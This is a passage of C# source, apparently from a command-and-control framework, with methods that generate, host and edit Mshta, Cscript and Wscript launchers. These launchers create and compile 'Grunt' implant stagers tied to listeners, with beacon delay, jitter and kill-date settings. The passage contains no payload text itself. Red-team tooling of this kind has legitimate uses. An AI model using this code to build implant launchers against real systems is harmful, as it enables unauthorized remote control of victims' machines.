            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetMshtaLauncher();
        }

        public async Task<MshtaLauncher> EditMshtaLauncher(MshtaLauncher launcher)
        {
            MshtaLauncher matchingLauncher = await this.GetMshtaLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetMshtaLauncher();
        }

        public async Task<CscriptLauncher> GetCscriptLauncher()
        {
            CscriptLauncher launcher = (CscriptLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Cscript);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - CscriptLauncher");
            }
            return launcher;
        }

        public async Task<CscriptLauncher> GenerateCscriptLauncher()
        {
            CscriptLauncher launcher = await this.GetCscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetCscriptLauncher();
        }

        public async Task<CscriptLauncher> GenerateCscriptHostedLauncher(HostedFile file)
        {
            CscriptLauncher launcher = await this.GetCscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetCscriptLauncher();
        }

        public async Task<CscriptLauncher> EditCscriptLauncher(CscriptLauncher launcher)
        {
            CscriptLauncher matchingLauncher = await this.GetCscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetCscriptLauncher();
        }

        public async Task<WscriptLauncher> GetWscriptLauncher()
        {
            WscriptLauncher launcher = (WscriptLauncher)await _context.Launchers.FirstOrDefaultAsync(S => S.Type == LauncherType.Wscript);
            if (launcher == null)
            {
                throw new ControllerNotFoundException($"NotFound - WscriptLauncher");
            }
            return launcher;
        }

        public async Task<WscriptLauncher> GenerateWscriptLauncher()
        {
            WscriptLauncher launcher = await this.GetWscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            ImplantTemplate template = await this.GetImplantTemplate(launcher.ImplantTemplateId);
            Profile profile = await this.GetProfile(listener.ProfileId);
            Grunt grunt = new Grunt
            {
                ListenerId = listener.Id,
                Listener = listener,
                ImplantTemplateId = template.Id,
                ImplantTemplate = template,
                SMBPipeName = launcher.SMBPipeName,
                ValidateCert = launcher.ValidateCert,
                UseCertPinning = launcher.UseCertPinning,
                Delay = launcher.Delay,
                JitterPercent = launcher.JitterPercent,
                ConnectAttempts = launcher.ConnectAttempts,
                KillDate = launcher.KillDate,
                DotNetVersion = launcher.DotNetVersion,
                RuntimeIdentifier = launcher.RuntimeIdentifier
            };

            await _context.Grunts.AddAsync(grunt);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateGrunt(this, grunt);

            launcher.GetLauncher(
                this.GruntTemplateReplace(template.StagerCode, template, grunt, listener, profile),
                CompileGruntCode(template.StagerCode, template, grunt, listener, profile, launcher),
                grunt,
                template
            );
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWscriptLauncher();
        }

        public async Task<WscriptLauncher> GenerateWscriptHostedLauncher(HostedFile file)
        {
            WscriptLauncher launcher = await this.GetWscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            HostedFile savedFile = await this.GetHostedFile(file.Id);
            string hostedLauncher = launcher.GetHostedLauncher(listener, savedFile);
            _context.Launchers.Update(launcher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, launcher);
            return await this.GetWscriptLauncher();
        }

        public async Task<WscriptLauncher> EditWscriptLauncher(WscriptLauncher launcher)
        {
            WscriptLauncher matchingLauncher = await this.GetWscriptLauncher();
            Listener listener = await this.GetListener(launcher.ListenerId);
            matchingLauncher.ListenerId = listener.Id;
            matchingLauncher.ImplantTemplateId = launcher.ImplantTemplateId;
            matchingLauncher.DotNetVersion = launcher.DotNetVersion;
            matchingLauncher.RuntimeIdentifier = launcher.RuntimeIdentifier;
            matchingLauncher.SMBPipeName = launcher.SMBPipeName;
            matchingLauncher.ValidateCert = launcher.ValidateCert;
            matchingLauncher.UseCertPinning = launcher.UseCertPinning;
            matchingLauncher.Delay = launcher.Delay;
            matchingLauncher.JitterPercent = launcher.JitterPercent;
            matchingLauncher.ConnectAttempts = launcher.ConnectAttempts;
            matchingLauncher.KillDate = launcher.KillDate;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.LauncherString = launcher.LauncherString;
            matchingLauncher.StagerCode = launcher.StagerCode;
            matchingLauncher.DiskCode = launcher.DiskCode;
            matchingLauncher.ScriptLanguage = launcher.ScriptLanguage;
            matchingLauncher.ProgId = launcher.ProgId;
            _context.Launchers.Update(matchingLauncher);
            await _context.SaveChangesAsync();
            // _notifier.OnEditLauncher(this, matchingLauncher);
            return await this.GetWscriptLauncher();
        }
        #endregion
    }
}
